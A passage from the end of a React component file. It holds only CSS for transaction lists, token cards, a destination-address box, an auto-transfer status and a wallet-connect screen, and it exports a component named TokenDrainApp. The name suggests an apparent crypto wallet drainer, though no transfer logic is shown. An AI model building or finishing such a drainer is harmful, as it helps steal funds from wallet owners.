          flex-wrap: wrap;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
        }
        
        .tx-network {
          color: #888;
          font-size: 12px;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
        }
        
        .tx-value {
          color: #10b981;
          font-weight: 600;
        }
        
        .tx-secondary {
          display: flex;
          gap: 10px;
          flex-wrap: wrap;
          font-size: 12px;
        }
        
        .tx-status {
          font-weight: 600;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-message {
          color: #888;
        }
        
        .tx-link {
          color: #3b82f6;
          text-decoration: none;
          font-size: 12px;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .network-badge {
          padding: 4px 8px;
          border-radius: 6px;
          font-weight: 600;
          font-size: 12px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-status {
          margin-bottom: 8px;
        }
        
        .status-auto {
          color: #f59e0b;
          font-weight: 600;
          font-size: 12px;
        }
        
        .token-destination {
          background: #222;
          border-radius: 6px;
          padding: 8px;
          font-family: monospace;
          font-size: 10px;
          color: #888;
          border: 1px solid #333;
          word-break: break-all;
        }
        
        /* Error Alert */
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        .error-help {
          font-size: 12px;
          opacity: 0.9;
          margin-top: 5px;
          color: #ffd700;
        }
        
        .error-close {
          background: none;
          border: none;
          color: white;
          font-size: 20px;
          cursor: pointer;
          padding: 5px;
        }
        
        /* TRON Status */
        .tron-status {
          background: rgba(255, 6, 10, 0.15);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 1px solid rgba(255, 6, 10, 0.3);
          animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
          from { transform: translateY(-10px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        
        .tron-status-icon {
          font-size: 24px;
          background: rgba(255, 6, 10, 0.2);
          width: 40px;
          height: 40px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .tron-status-details {
          flex: 1;
        }
        
        .tron-status-title {
          font-size: 14px;
          color: #ff6b6b;
          font-weight: 600;
          margin-bottom: 5px;
        }
        
        .tron-status-info {
          font-size: 12px;
          color: #ddd;
        }
        
        /* Empty State */
        .empty-state {
          text-align: center;
          padding: 40px 20px;
          background: #222;
          border-radius: 16px;
          border: 1px solid #333;
        }
        
        .empty-icon {
          font-size: 48px;
          margin-bottom: 20px;
        }
        
        .empty-state h3 {
          color: white;
          margin-bottom: 10px;
        }
        
        .empty-state p {
          color: #888;
          margin-bottom: 20px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-content {
          background: #222;
          border-radius: 16px;
          padding: 40px;
          border: 1px solid #333;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-screen h2 {
          color: #ef4444;
          margin-bottom: 15px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .connect-section {
          margin-bottom: 30px;
        }
        
        .mobile-features {
          text-align: left;
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          margin-top: 20px;
        }
        
        .mobile-features .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
          padding-left: 20px;
          position: relative;
        }
        
        .mobile-features .feature:before {
          content: '✓';
          color: #10b981;
          position: absolute;
          left: 0;
          font-weight: bold;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 15px;
            text-align: center;
          }
          
          .connected-wallet {
            justify-content: center;
          }
          
          .stats-row {
            flex-direction: column;
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .summary-breakdown {
            flex-direction: column;
            gap: 5px;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
